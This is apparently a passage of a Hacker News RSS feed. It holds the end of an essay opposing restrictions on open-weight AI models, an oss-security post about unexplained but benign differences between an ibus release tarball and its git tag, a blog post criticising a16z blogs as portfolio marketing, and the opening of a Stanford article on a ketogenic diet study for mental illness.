that could be useful?</span></p></blockquote><p>Yes, standard licenses would be a huge help. I expect this will happen organically, as it has in the open source ecosystem.</p><p>The main concern with having many individual licenses is that legal departments have to get involved to read and accept each one. Having standards (like MIT, Apache 2.0, AGPL, etc in open source) allows organizations and lawyers to issue blanket guidance, so engineers can adopt new technology without getting the legal department with every decision.</p><p>As the market evolves, it will naturally standardize on a few different licenses.</p><blockquote><p><span>7. </span><strong>What are current or potential voluntary, domestic regulatory, and international mechanisms to manage the risks and maximize the benefits of foundation models with widely available weights?</strong><span> What kind of entities should take a leadership role across which features of governance?</span></p></blockquote><p>Regulations and laws around AI come in two flavors:</p><ul><li><p>Restrictions on usage</p></li><li><p>Restrictions on distribution</p></li></ul><p>Restricting certain usage of AI is common sense. Many current laws already apply to nefarious usage of AI (e.g. libel laws prevent the dissemination of fake images of private citizens). But new legislation here will be helpful (e.g. disallowing AI-generated images in advertising, or clarifying copyright law for works that imitate the style of a living artist).</p><p>Restricting distribution is more fraught. It would prevent law-abiding entities from accessing the technology, while criminals would continue to find ways to access it. It would completely stop positive uses, while only putting a surmountable hurdle in front of malicious uses.</p><p>That said, we can still regulate platforms and products that make AI widely available to end-users. We can ensure they have mechanisms in place for preventing abuse and for responding to security issues.</p><blockquote><p>a. What security, legal, or other measures can reasonably be employed to reliably prevent wide availability of access to a foundation model’s weights, or limit their end use?</p></blockquote><p>To regulate the distribution of models, we’d need to regulate two separate types of entities:</p><ul><li><p>Creator organizations, like OpenAI, Stability AI, Mistral AI, Meta, etc.</p></li><li><p>Disseminating organizations, like GitHub, Hugging Face, Dropbox, etc.</p></li></ul><p>Creator organizations would need to disclose who was given access to the weights, and what security controls were put in place to keep them private.</p><p>Disseminating organizations would need to respond to takedown notices, just as they do today with copyright violations.</p><blockquote><p>b. How might the wide availability of open foundation model weights facilitate, or else frustrate, government action in AI regulation?</p></blockquote><p>Open model distribution removes a “chokepoint” for AI, similar to how an open internet removes chokepoints.</p><p>Oppressive governments often deliberately create internet chokepoints, e.g. shutting down DNS when protests start to gather to prevent coordination on social media.</p><p>In a closed AI world, similar chokepoints are easier to establish. E.g. OpenAI can shut down its servers to stop GPT from being used; the same can’t be said for open models like LLaMa.</p><blockquote><p>c. When, if ever, should entities deploying AI disclose to users or the general public that they are using open foundation models either with or without widely available weights?</p></blockquote><p>This shouldn’t be a requirement, any more than disclosing which version of PHP runs your website.</p><p>Disclosing which AI is driving your product gives attackers an extra piece of information they can exploit. If you tell the world you’re using LLaMa, and a new prompt injection attack is discovered for LLaMa, attackers can immediately start applying it to your app.</p><p>That said, organizations might still choose to disclose this, e.g. for marketing or recruitment purposes.</p><blockquote><p><strong>d. What role, if any, should the U.S. government take in setting metrics for risk, creating standards for best practices, and/or supporting or restricting the availability of foundation model weights?</strong></p></blockquote><p>The U.S. government should provide a robust set of guidelines for deploying and distributing AI safely and securely.</p><p>We will also need laws restricting how generative AI can be used by individuals and organizations. E.g. we might make it illegal to use AI-generated imagery in advertisements, or enhance libel laws to punish harmful AI-generated images.</p><p><span>The U.S. government should </span><em>not</em><span> restrict the availability of model weights to the public. Doing so would only harm good actors, and add a minor hindrance for bad actors. It would hamper security researchers and academics, while giving an advantage to nefarious state-level actors.</span></p><p>The U.S. government should instead encourage and fund the development of open models, which will strengthen the U.S. economy and enhance our preparedness for an AI-equipped adversary.</p><blockquote><p>i. Should other government or non- government bodies, currently existing or not, support the government in this role? Should this vary by sector?</p></blockquote><p>Yes, the government should rely on non-profits and third-parties to:</p><ul><li><p>Create standards for evaluating AI security</p></li><li><p>Create standards for licensing open and closed models</p></li><li><p>Audit both open and closed models for performance, robustness, truthfulness, and security</p></li></ul><p>Certain sectors (especially healthcare and finance) will naturally come up with their own standards and evaluation frameworks.</p><blockquote><p><span>e. What should the role of model hosting services (</span><em>e.g., </em><span>HuggingFace, GitHub, etc.) be in making dual-use models with open weights more or less available? </span><strong>Should hosting services host models that do not meet certain safety standards? By whom should those standards be prescribed?</strong></p></blockquote><p>There should be a system for notifying the hosting service of models that have security flaws, backdoors, or private information—just as there is today for source code and other media.</p><p>Users, government officials, and security researchers should be able to report particular models to the host, indicating the problem and its severity. E.g. if a model is found to have memorized individual social security numbers, or if it is regurgitating CSAM from its training set, the hosting organization should take down the model immediately, and notify the maintainer. If a model has less severe security flaws (e.g. a prompt injection vulnerability) the maintainer should be informed.</p><p>GitHub today does a good job of this—they highlight a list of known vulnerabilities in every repository (private to the repository owner), and quickly take down projects that violate copyright or other laws.</p><p>The government should set a high bar for problems that require a project to be taken down immediately (e.g. leaking highly sensitive information), and allow hosting providers to self-regulate below that bar.</p><blockquote><p>f. Should there be different standards for government as opposed to private industry when it comes to sharing model weights of open foundation models or contracting with companies who use them?</p></blockquote><p>It might be tempting to restrict public/private access to models, while relaxing those restrictions for government organizations. But this would impede a great deal of economic and technological progress. It would make the U.S. less competitive in the global economy, and more susceptible to attack.</p><p>It might also be tempting for the government to restrict the distribution of open models, and instead provide its own government-approved models to the public. But the U.S. government has little history or experience with building, maintaining, and deploying open source software at that level of scale. The quality of government-managed models would likely be far worse than privately managed models.</p><blockquote><p>g. What should the U.S. prioritize in working with other countries on this topic, and which countries are most important to work with?</p></blockquote><p>There are two categories of countries we need to discuss: Allies and Adversaries.</p><p>We should encourage allies to adopt similar regulations to our own. Whichever country takes the laxest approach to model regulation will likely outcompete other nations. Furthermore, lax laws in one country can effectively be exploited by users in another country—a U.S. citizen could use a VPN or fly to the EU to download a model that is restricted in the U.S.</p><p>We will need to work with adversaries as well. Building collaborative relationships between our research teams and theirs, our security teams and theirs, etc, will help keep the world aligned when it comes to AI safety.</p><p>Collaboration between e.g. U.S. and Chinese citizens is already significant in the open source world. The U.S. government should avoid getting in the way of this kind of collaboration.</p><blockquote><p>h. What insights from other countries or other societal systems are most useful to consider?</p></blockquote><p>There are two major regulatory pushes internationally:</p><ul><li><p><span>The EU has passed legislation to </span><a href="https://www.europarl.europa.eu/topics/en/article/20230601STO93804/eu-ai-act-first-regulation-on-artificial-intelligence" rel="nofollow ugc noopener">reduce social harms caused by AI</a></p></li><li><p><span>China has enacted regulations </span><a href="https://carnegieendowment.org/2023/07/10/china-s-ai-regulations-and-how-they-get-made-pub-90117" rel="nofollow ugc noopener">aimed at controlling information</a></p></li></ul><p>The US should follow the EU more than China. We should work to mitigate the harm done to society, rather than trying to centralize control of a promising new technology.</p><blockquote><p>i. Are there effective mechanisms or procedures that can be used by the government or companies to make decisions regarding an appropriate degree of availability of model weights in a dual-use foundation model or the dual-use foundation model ecosystem? Are there methods for making effective decisions about open AI deployment that balance both benefits and risks? This may include responsible capability scaling policies, preparedness frameworks, et cetera.</p></blockquote><p>As stated above, “degree of availability” is not a very sensible idea. Availability is either “on” or “off”, with only some minor gradations in either extreme.</p><p>That said, government and creator companies can mitigate risk by:</p><ul><li><p>Working with researchers and independent auditors to assess the model</p></li><li><p>Candidly acknowledging the limitations of models</p></li><li><p>Shipping models with licenses that restrict socially harmful usage</p></li><li><p>Disclosing risks and vulnerabilities as they’re found</p></li></ul><blockquote><p><span>j. </span><strong>Are there particular individuals/ entities who should or should not have access</strong><span> to open-weight foundation models? If so, why and under what circumstances?</span></p></blockquote><p>No. We shouldn’t restrict an individual’s access to an open model any more than we should restrict their access to the internet or to certain books. And unless the person is incarcerated, doing so is technically infeasible.</p><blockquote><p>8. In the face of continually changing technology, and given unforeseen risks and benefits, how can governments, companies, and individuals make decisions or plans today about open foundation models that will be useful in the future?</p></blockquote><p><span>Legislating against nefarious </span><em>usage</em><span> of AI, and interpreting existing laws in light of the new technology, will be the most scalable way to future-proof AI regulation.</span></p><p>Legislation that focuses on particular technologies (e.g. “large language models”) or on specs (e.g. number of weights or floating-point operations per second) is almost guaranteed to become obsolete within months to years.</p><blockquote><p><strong>a. How should these potentially competing interests of innovation, competition, and security be addressed or balanced?</strong></p></blockquote><p>Striking a balance between innovation and security will be crucial.</p><p>Enacting and enforcing laws that punish the abuses of AI is crucial. If we don’t regulate at all, we will likely see a large increase in harm done to individuals. Media will become increasingly “bait” driven as companies tune images, video, and text to our personal psychology. Fake images, including libelous and non-consensual intimate images, will proliferate. Fake news will become easier to churn out. Public trust will erode.</p><p>Conversely, if we regulate too heavily out of fear, other countries will quickly outcompete us. New AI applications will flourish in the EU and China, while U.S. citizens are forced to stick to a few walled gardens. Given the potential for AI not just as a new industry, but as an economic accelerant, this would be disastrous.</p><p><span>Ironically, over-regulating access to AI would harm </span><em>both</em><span> innovation </span><em>and </em><span>security, as it prevents academics and researchers from fully studying AI. Adversarial governments and other bad actors would have an information advantage, which they could use to attack the US or steal intellectual property.</span></p><blockquote><p>b. Noting that E.O. 14110 grants the Secretary of Commerce the capacity to adapt the threshold, is the amount of computational resources required to build a model, such as the cutoff of 1026 integer or floating-point operations used in the Executive order, a useful metric for thresholds to mitigate risk in the long-term, particularly for risks associated with wide availability of model weights?</p></blockquote><p>Hard technical cutoffs here are naive. As the technology evolves, we will find ways to get the same performance out of smaller models. The stated limitations will quickly become obsolete.</p><blockquote><p>c. Are there more robust risk metrics for foundation models with widely available weights that will stand the test of time? Should we look at models that fall outside of the dual-use foundation model definition?</p></blockquote><p>Any cutoffs should be based on evaluation metrics. For example, you could limit access to LLMs that score above 90% on HumanEval pass@1—this would be robust to future technological developments. These cutoffs would also be applicable for a wider array of AI technologies.</p><p>However, this sort of cutoff would be catastrophically bad for the competitive landscape, and would greatly hinder technological progress.</p><blockquote><p>9. What other issues, topics, or adjacent technological advancements should we consider when analyzing risks and benefits of dual-use foundation models with widely available model weights?</p></blockquote><p>Generative AI ties in deeply with virtual and augmented reality, as well as with traditional media. It gives media companies the potential to craft videos, images, and text that are maximally alluring, and to tailor media to individual psychological profiles. We need to regulate the use of AI in entertainment and advertising.</p><p>Copyright is another concern. Models which are trained on a corpus of music, painting, writing, etc can then imitate the styles of particular creators, creating competing media on demand. We’ll need to clarify copyright law when it comes to disseminating derivative AI-generated works.</p><p>I’m happy to see the US government taking this topic seriously. The new generation of AI will be transformative, and will certainly cause both economic and social disruption. Intelligent, thoughtful regulation can help to mitigate the harms and amplify the benefits.</p><p>The focus, as always, should be on regulating large, profit-driven organizations—not individuals, academics, and researchers. If AI technology poses an existential threat, that threat comes from state- and enterprise-level actors—not PhD students and open source developers.</p><p>To be sure, some individuals will find harmful ways to use AI. They might generate non-consensual intimate imagery, post incendiary fake images on social media, or use AI to amplify their political views. These issues are best mitigated through existing laws (e.g. libel/slander/defamation laws) and platform regulation (e.g. holding Facebook responsible for disseminating false information).</p><p>Again, there are two approaches to social harm: we can disincentivize it through punishment, or we can try to eradicate it through surveillance and control. The former is the norm in free societies, while the latter is a hallmark of oppression.</p><p>I understand why the government is tempted to ban open models. But doing so would be disastrous for national security, for our economy, and for individual liberty.</p><p><span>If you agree, please </span><a href="https://www.regulations.gov/document/NTIA-2023-0009-0001" rel="nofollow ugc noopener">send your comments</a><span> to the DoC by March 27th, 2024.</span></p><p data-attrs="{&quot;url&quot;:&quot;https://rbren.substack.com/p/banning-open-weight-models-would?utm_source=substack&amp;utm_medium=email&amp;utm_content=share&amp;action=share&quot;,&quot;text&quot;:&quot;Share&quot;,&quot;action&quot;:null,&quot;class&quot;:null}" data-component-name="ButtonCreateButton"><a href="https://rbren.substack.com/p/banning-open-weight-models-would?utm_source=substack&amp;utm_medium=email&amp;utm_content=share&amp;action=share" rel="nofollow ugc noopener"><span>Share</span></a></p></div></article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[From xz to ibus: more questionable tarballs (165 pts)]]></title>
            <link>https://www.openwall.com/lists/oss-security/2024/04/01/1</link>
            <guid>39901655</guid>
            <pubDate>Tue, 02 Apr 2024 02:09:08 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.openwall.com/lists/oss-security/2024/04/01/1">https://www.openwall.com/lists/oss-security/2024/04/01/1</a>, See on <a href="https://news.ycombinator.com/item?id=39901655">Hacker News</a></p>
<div id="readability-page-1" class="page">


<table>
<tbody><tr>

<td>
<a href="https://www.openwall.com/"><img src="https://www.openwall.com/logo.png" width="182" height="80" alt="Openwall"></a>
</td><td>
<div>
<ul>
<li><a href="https://www.openwall.com/">Products</a>
<ul>
<li><a href="https://www.openwall.com/Owl/">Openwall GNU/*/Linux &nbsp; <i>server OS</i></a>
</li><li><a href="https://www.openwall.com/lkrg/">Linux Kernel Runtime Guard</a>
</li><li><a href="https://www.openwall.com/john/">John the Ripper &nbsp; <i>password cracker</i></a>
<ul>
<li><a href="https://www.openwall.com/john/">Free &amp; Open Source for any platform</a>
</li><li><a href="https://www.openwall.com/john/cloud/">in the cloud</a>
</li><li><a href="https://www.openwall.com/john/pro/linux/">Pro for Linux</a>
</li><li><a href="https://www.openwall.com/john/pro/macosx/">Pro for macOS</a>
</li></ul>
</li><li><a href="https://www.openwall.com/wordlists/">Wordlists &nbsp; <i>for password cracking</i></a>
</li><li><a href="https://www.openwall.com/passwdqc/">passwdqc &nbsp; <i>policy enforcement</i></a>
<ul>
<li><a href="https://www.openwall.com/passwdqc/">Free &amp; Open Source for Unix</a>
</li><li><a href="https://www.openwall.com/passwdqc/windows/">Pro for Windows (Active Directory)</a>
</li></ul>
</li><li><a href="https://www.openwall.com/yescrypt/">yescrypt &nbsp; <i>KDF &amp; password hashing</i></a>
</li><li><a href="https://www.openwall.com/yespower/">yespower &nbsp; <i>Proof-of-Work (PoW)</i></a>
</li><li><a href="https://www.openwall.com/crypt/">crypt_blowfish &nbsp; <i>password hashing</i></a>
</li><li><a href="https://www.openwall.com/phpass/">phpass &nbsp; <i>ditto in PHP</i></a>
</li><li><a href="https://www.openwall.com/tcb/">tcb &nbsp; <i>better password shadowing</i></a>
</li><li><a href="https://www.openwall.com/pam/">Pluggable Authentication Modules</a>
</li><li><a href="https://www.openwall.com/scanlogd/">scanlogd &nbsp; <i>port scan detector</i></a>
</li><li><a href="https://www.openwall.com/popa3d/">popa3d &nbsp; <i>tiny POP3 daemon</i></a>
</li><li><a href="https://www.openwall.com/blists/">blists &nbsp; <i>web interface to mailing lists</i></a>
</li><li><a href="https://www.openwall.com/msulogin/">msulogin &nbsp; <i>single user mode login</i></a>
</li><li><a href="https://www.openwall.com/php_mt_seed/">php_mt_seed &nbsp; <i>mt_rand() cracker</i></a>
</li></ul>
</li><li><a href="https://www.openwall.com/services/">Services</a>
</li><li id="narrow-li-1"><a>Publications</a>
<ul>
<li><a href="https://www.openwall.com/articles/">Articles</a>
</li><li><a href="https://www.openwall.com/presentations/">Presentations</a>
</li></ul>
</li><li><a>Resources</a>
<ul>
<li><a href="https://www.openwall.com/lists/">Mailing lists</a>
</li><li><a href="https://openwall.info/wiki/">Community wiki</a>
</li><li><a href="https://github.com/openwall">Source code repositories (GitHub)</a>
</li><li><a href="https://cvsweb.openwall.com/">Source code repositories (CVSweb)</a>
</li><li><a href="https://www.openwall.com/mirrors/">File archive &amp; mirrors</a>
</li><li><a href="https://www.openwall.com/signatures/">How to verify digital signatures</a>
</li><li><a href="https://www.openwall.com/ove/">OVE IDs</a>
</li></ul>
</li><li id="last-li"><a href="https://www.openwall.com/news">What's new</a>
</li></ul>
</div>


</td></tr></tbody></table>




<a href="https://www.openwall.com/lists/oss-security/2024/03/31/13">[&lt;prev]</a> <a href="https://www.openwall.com/lists/oss-security/2024/04/01/2">[next&gt;]</a> <a href="https://www.openwall.com/lists/oss-security/2024/04/01/3">[thread-next&gt;]</a> <a href="https://www.openwall.com/lists/oss-security/2024/04/01/">[day]</a> <a href="https://www.openwall.com/lists/oss-security/2024/04/">[month]</a> <a href="https://www.openwall.com/lists/oss-security/2024/">[year]</a> <a href="https://www.openwall.com/lists/oss-security/">[list]</a>
<pre>Date: Mon, 1 Apr 2024 14:58:30 +0200 (CEST)
From: Jan Engelhardt &lt;jengelh@...i.de&gt;
To: oss-security@...ts.openwall.com
cc: takao.fujiwara1@...il.com
Subject: From xz to ibus: more questionable tarballs


In the ibus repository at <a href="https://github.com/ibus/ibus" rel="nofollow">https://github.com/ibus/ibus</a> ,
commit 0ad8e77bd36545974ad8acd0a5283cf72bc7c8ad
was tagged as refs/tags/1.5.29-rc2 (+signed) on 2023-11-09,
and a disted tarball was made available (but unsigned), and Linux distros have
imported it (file checksums all line up).

<a href="https://github.com/ibus/ibus/releases/download/1.5.29/ibus-1.5.29-rc2.tar.gz" rel="nofollow">https://github.com/ibus/ibus/releases/download/1.5.29/ibus-1.5.29-rc2.tar.gz</a>

Comparing this disttar to the git repository and favorably
*discounting* autotools-related files and (what appears to be)
vala-to-c transpiling, I'm left with benign, but unexplicable
changes. It seems the git is "older", as e.g. one still finds "beta3"
in the diff, but also the disttar's ibuscodegen.h has an older
copyright line and an incomplete cherry-pick from
8f00d67b809036b0b76ae257cfe7e102bc8f1dec.

*runs away screaming*

In light of the xz revelations, I thought it's worth pointing out 
this class of problems.


$ tar -xf ibus-1.5.29-rc2.tar.gz
$ git clone -b 1.5.29-rc2 <a href="https://github.com/ibus/ibus" rel="nofollow">https://github.com/ibus/ibus</a> ibus-git
$ diff -dprux .git ibus-git ibus-1.5.29-rc2
diff -dpru ibus-git/engine/simple.xml.in ibus-1.5.29-rc2/engine/simple.xml.in
--- ibus-git/engine/simple.xml.in       2024-04-01 14:08:16.541903956 +0200
+++ ibus-1.5.29-rc2/engine/simple.xml.in        2023-11-09 07:10:15.000000000 +0100
@@ -3,781 +3,596 @@
     &lt;name&gt;org.freedesktop.IBus.Simple&lt;/name&gt;
     &lt;description&gt;A table based simple engine&lt;/description&gt;
     &lt;exec&gt;@libexecdir@...us-engine-simple&lt;/exec&gt;
-    &lt;version&gt;1.5.29-beta3.20230822&lt;/version&gt;
+    &lt;version&gt;1.5.29-rc2.20231109&lt;/version&gt;
     &lt;author&gt;Peng Huang &amp;lt;shawn.p.huang@...il.com&amp;gt;&lt;/author&gt;
     &lt;license&gt;GPL&lt;/license&gt;
...
--- ibus-git/po/de.po   2024-04-01 14:08:16.555237247 +0200
+++ ibus-1.5.29-rc2/po/de.po    2023-11-09 07:10:08.000000000 +0100
@@ -22,7 +22,7 @@ msgid ""
 msgstr ""
 "Project-Id-Version: IBus\n"
 "Report-Msgid-Bugs-To: <a href="https://github.com/ibus/ibus/issues" rel="nofollow">https://github.com/ibus/ibus/issues</a>\n"
-"POT-Creation-Date: 2023-08-02 00:14+0900\n"
+"POT-Creation-Date: 2023-11-09 15:10+0900\n"
 "PO-Revision-Date: 2023-08-04 17:21+0000\n"
 "Last-Translator: Mike FABIAN &lt;mfabian@...hat.com&gt;\n"
 "Language-Team: German &lt;<a href="https://translate.fedoraproject.org/projects/ibus/" rel="nofollow">https://translate.fedoraproject.org/projects/ibus/</a>"
diff -dpru ibus-git/src/ibusunicodegen.h ibus-1.5.29-rc2/src/ibusunicodegen.h
--- ibus-git/src/ibusunicodegen.h       2024-04-01 14:08:16.568570535 +0200
+++ ibus-1.5.29-rc2/src/ibusunicodegen.h        2023-11-09 07:09:53.000000000 +0100
@@ -1,8 +1,8 @@
 /* -*- mode: C; c-basic-offset: 4; indent-tabs-mode: nil; -*- */
 /* vim:set et sts=4: */
 /* ibus - The Input Bus
- * Copyright (C) 2018-2023 Takao Fujiwara &lt;takao.fujiwara1@...il.com&gt;
- * Copyright (C) 2018-2023 Red Hat, Inc.
+ * Copyright (C) 2018-2021 Takao Fujiwara &lt;takao.fujiwara1@...il.com&gt;
+ * Copyright (C) 2018-2021 Red Hat, Inc.
  *
  * This library is free software; you can redistribute it and/or
  * modify it under the terms of the GNU Lesser General Public
@@ -1310,6 +1310,10 @@ const static char *unicode_blocks[] = {
     /* TRANSLATORS: You might refer the translations from gucharmap with
                     the following command:
        msgmerge -C gucharmap.po ibus.po ibus.pot */
+    N_("CJK Unified Ideographs Extension I"),
+    /* TRANSLATORS: You might refer the translations from gucharmap with
+                    the following command:
+       msgmerge -C gucharmap.po ibus.po ibus.pot */
     N_("CJK Compatibility Ideographs Supplement"),
     /* TRANSLATORS: You might refer the translations from gucharmap with
                     the following command:
</pre>
<p><a href="http://www.openwall.com/blists/">Powered by blists</a> - <a href="http://lists.openwall.net/">more mailing lists</a>


</p><p>
Please check out the
<a href="https://oss-security.openwall.org/wiki/">
Open Source Software Security Wiki</a>, which is counterpart to this
<a href="https://oss-security.openwall.org/wiki/mailing-lists/oss-security">mailing list</a>.
</p><p>
Confused about <a href="https://www.openwall.com/lists/">mailing lists</a> and their use?
<a href="https://en.wikipedia.org/wiki/Electronic_mailing_list">Read about mailing lists on Wikipedia</a>
and check out these
<a href="https://www.complang.tuwien.ac.at/anton/mail-news-errors.html">guidelines on proper formatting of your messages</a>.
</p></div>]]></description>
        </item>
        <item>
            <title><![CDATA[A16Z Blogs Are Just Glorified Marketing (261 pts)]]></title>
            <link>https://frankzliu.com/blog/a16z-blogs-are-just-glorified-marketing</link>
            <guid>39901289</guid>
            <pubDate>Tue, 02 Apr 2024 01:08:54 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://frankzliu.com/blog/a16z-blogs-are-just-glorified-marketing">https://frankzliu.com/blog/a16z-blogs-are-just-glorified-marketing</a>, See on <a href="https://news.ycombinator.com/item?id=39901289">Hacker News</a></p>
<div id="readability-page-1" class="page"><div itemprop="articleBody">
    <h4 id="-glorified-marketing-for-portfolio-companies-that-is">… glorified marketing for portfolio companies, that is</h4>

<p>I came across one of a16z’s blog posts on Hacker News today, titled <a href="https://a16z.com/2023/06/20/emerging-architectures-for-llm-applications">Emerging Architectures for LLM Applications</a>. For folks who didn’t catch it, here’s the tl;dr:</p>

<ul>
  <li>The emerging LLM stack is composed of several elements centered around data orchestration tools such as Langchain and Llamaindex. Data pipelines, embedding models, vector databases, and queries form the primary input for these orchestration tools.</li>
  <li>The stack is based on in-context learning, where off-the-shelf LLMs are used and their behavior is controlled through prompting and conditioning on contextual data.</li>
  <li>Strategies for prompting LLMs are becoming increasingly complex and are a core differentiating factor for both closed-source and open-source LLMs. Of these LLMs, strategies for GPT-3.5 and GPT-4 are most common, seeing as OpenAI is the current leader.</li>
  <li>AI agents - programmatic runtimes that can reason and plan - excite both developers and researchers alike, but don’t work just yet. Most agent frameworks are currently in PoC phase.</li>
</ul>

<p>Overall, I thought the article was informative, but I was surprised that the section on vector databases mentions neither <a href="https://milvus.io/">Milvus</a> nor <a href="https://zilliz.com/">Zilliz</a>, especially since Milvus was mentioned in an older <a href="https://a16z.com/2020/10/15/emerging-architectures-for-modern-data-infrastructure/">a16z blog on data and ML infrastructure</a>:</p>

<p><img src="https://frankzliu.com/img/emerging-architectures-vector-databases.jpg">
</p>
<p><sub>Also of note: another Zilliz project (<a href="https://github.com/zilliztech/GPTCache">GPTCache</a>) is listed in the post.</sub></p>

<p>My initial instinct was that Milvus was left off because it is part of the LF AI &amp; Data Foundation rather being a project wholly owned by Zilliz, so I left a comment on the HN post that links back to the Milvus website. I came back a couple of hours later to find an interesting take:</p>

<p><img src="https://frankzliu.com/img/emerging-architectures-comment.jpg">
</p>
<p><sub>Full disclosure: we (Zilliz) raised $103M back in 2022, and Pinecone raised $100M this April.</sub></p>

<p>Running it back in my head, I felt that SheepHerdr’s response actually made excellent sense - a16z’s ultimate goal is to generate returns for LPs, and the best way to do that is by supporting founders and propping their portfolio companies. To me, this is also unequivocally unfair to Vespa, Weaviate, etc as it delivers a subliminal message that they have no realistic long-term chance in the vector database space relative to Pinecone. This, of course, is absolute nonsense: vector databases are <em>NOT</em> a zero-sum game.</p>

<p>I dove a bit deeper and was surprised to find that this is fairly commonplace behavior for a16z as a firm:</p>

<ul>
  <li>The aforementioned article also lists Databricks in the “Data Pipelines” section, but not <a href="https://www.snowflake.com/blog/building-data-centric-platform-ai-llm/">Snowflake</a>. There is a <a href="https://github.com/hwchase17/langchain/blob/master/langchain/document_loaders/snowflake_loader.py">Snowflake loader for Langchain</a> and a guide for using <a href="https://github.com/jerryjliu/llama_index/blob/main/docs/guides/tutorials/sql_guide.md">Llamaindex with Snowflake</a>. Databricks is an a16z portfolio company.</li>
  <li><a href="https://a16z.com/2023/04/14/the-modern-transactional-stack/">The Modern Transactional Stack</a> doesn’t come close to listing all of the available data connectors. To be fair, Airbyte and Fivetran (an a16z portfolio company) are the two largest and most well-known, but to distill the entire segment to just two companies seems unfair.</li>
  <li>a16z’s crypto division has backed LayerZero, going as far as actively <a href="https://www.dlnews.com/articles/defi/uniswap-taps-wormhole-for-bridge-to-bnb-in-defeat-for-a16z/">voting against Wormhole</a>, a LayerZero competitor. Side note: LayerZero was also featured in a16z’s <a href="https://a16zcrypto.com/posts/announcement/crypto-startup-school-2023-recap-resources/">Crypto Startup School</a>.</li>
</ul>

<p>These are just three random examples I dug out - there are probably many other examples in verticals that I am unfamiliar with.</p>

<h4 id="other-llmgenai-infrastructure-landscapes">Other LLM/GenAI Infrastructure landscapes</h4>

<p>Here’s a couple alternative landscapes that are, in my eyes, more wholly representative:</p>
<ul>
  <li><a href="https://mattturck.com/mad2023">ML/AI/Data Landscape</a> (<a href="https://mad.firstmark.com/">Interactive version</a>). Matt Turck’s MAD Landscape is arguably the most complete out there. Companies that do vector search are listed under “Infrastructure/Vector Database” and “Analytics/Enterprise Search” categories. It was released in February 2023 so it’s about 4 months old, but a good resource nonetheless.</li>
  <li><a href="https://www.unusual.vc/post/ai-native-infrastructure-will-be-open">Future of AI-Native Infrastructure</a>. This one’s from Wei Lien Dang and David Hershey of Unusual Ventures. I found this pretty unique as it has a vertical for AI agents. It’s unfortunately not as complete as the MAD Landscape (missing Vespa, Vectara, etc), but still a good overview.</li>
  <li><a href="https://www.sequoiacap.com/article/llm-stack-perspective/">The New Language Model Stack</a>. Sequoia Capital’s blog post on the LLM stack is also excellent. Milvus isn’t in the diagram, but it’s mentioned in the section on vector databases.</li>
  <li><a href="https://twitter.com/YingjunWu/status/1667232357953466369/">Vector Database Landscape</a>. Yingjun Wu’s infographic is centered specifically around vector search infrastructure.</li>
</ul>

<h4 id="final-thoughts">Final thoughts</h4>

<p>I have tremendous respect for a16z, a firm that helped pioneer the practice of working with and nurturing founders rather than forcing them out pre-IPO or minmaxing term sheets. Their content is also incredibly informative and valuable for understanding the nuances of building a company, from finding PMF to hiring executives. I also wholeheartedly understand a16z’s motivation for sharing knowledge and highlighting their portfolio companies, but to do so under the guise of being helpful and impartial is just plain silly. In particular, a16z’s blog post yesterday has as much to do with emerging strategies for portfolio company marketing as it does with emerging architectures for LLM applications. This practice would be somewhat analagous to Google putting paid URLs at the very top of search results without an “Ad” label. (To be clear, Google doesn’t do this.)</p>

<p>I’d like to end with some glorified marketing of my own:</p>

<pre><code>% pip install milvus
</code></pre>

    <hr>

  </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Pilot study shows ketogenic diet improves mental illness (105 pts)]]></title>
            <link>https://med.stanford.edu/news/all-news/2024/04/keto-diet-mental-illness.html</link>
            <guid>39900857</guid>
            <pubDate>Mon, 01 Apr 2024 23:57:51 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://med.stanford.edu/news/all-news/2024/04/keto-diet-mental-illness.html">https://med.stanford.edu/news/all-news/2024/04/keto-diet-mental-illness.html</a>, See on <a href="https://news.ycombinator.com/item?id=39900857">Hacker News</a></p>
<div id="readability-page-1" class="page"><div itemprop="articleBody">

    
      
        <p itemprop="description">A small clinical trial led by Stanford Medicine found that the metabolic effects of a ketogenic diet may help stabilize the brain. </p>
      
    

   <p><span itemprop="datePublished">April 1, 2024</span> 
       - By Nina Bai</p>


    <div><div>























<wcmmode:edit>
    
</wcmmode:edit>


    
    
        
    



<div id="" data-fullscreen-modal="false">
                    <p>A study led by researchers at Stanford Medicine showed that diet can help those with serious mental illness.<br>
<a href="https://stock.adobe.com/contributor/211253573/nishihata?load_type=author&amp;prev_url=detail">nishihata</a></p>
                </div></div>
<div id="main_content">
    <p>For people living with serious mental illness like schizophrenia or bipolar disorder, standard treatment with antipsychotic medications can be a double-edged sword. While these drugs help regulate brain chemistry, they often cause metabolic side effects such as insulin resistance and obesity, which are distressing enough that many patients stop taking the medications.</p>
<p>Now, a pilot study led by Stanford Medicine researchers has found that a ketogenic diet not only restores metabolic health in these patients as they continue their medications, but it further improves their psychiatric conditions. The results, <a href="https://www.sciencedirect.com/science/article/pii/S0165178124001513?via%3Dihub">published</a> March 27 in <i>Psychiatry Research</i>, suggest that a dietary intervention can be a powerful aid in treating mental illness.</p>
<p>“It’s very promising and very encouraging that you can take back control of your illness in some way, aside from the usual standard of care,” said <a href="https://profiles.stanford.edu/shebani-sethi">Shebani Sethi</a>, MD, associate professor of psychiatry and behavioral sciences and the first author of the new paper.</p>
<p><iframe width="560" height="315" src="https://www.youtube.com/embed/14gFafGUY8I?si=uKJHDnfKVjq33xh3" title="YouTube video player" frameborder="0">&amp;nbsp;</iframe></p>
<h3>Making the connection</h3>
<p>Sethi, who is board certified in obesity and psychiatry, remembers when she first noticed the connection. As a medical student working in an obesity clinic, she saw a patient with treatment-resistant schizophrenia whose auditory hallucinations quieted on a ketogenic diet.</p>
<p>That prompted her to dig into the medical literature. There were only a few, decades-old case reports on using the ketogenic diet to treat schizophrenia, but there was a long track record of success in using ketogenic diets to treat epileptic seizures.</p>
<p>“The ketogenic diet has been proven to be effective for treatment-resistant epileptic seizures by reducing the excitability of neurons in the brain,” Sethi said. “We thought it would be worth exploring this treatment in psychiatric conditions.”</p>
<p>A few years later, Sethi coined the term metabolic psychiatry, a new field that approaches mental health from an energy conversion perspective.</p>

</div>

<div id="main_text">
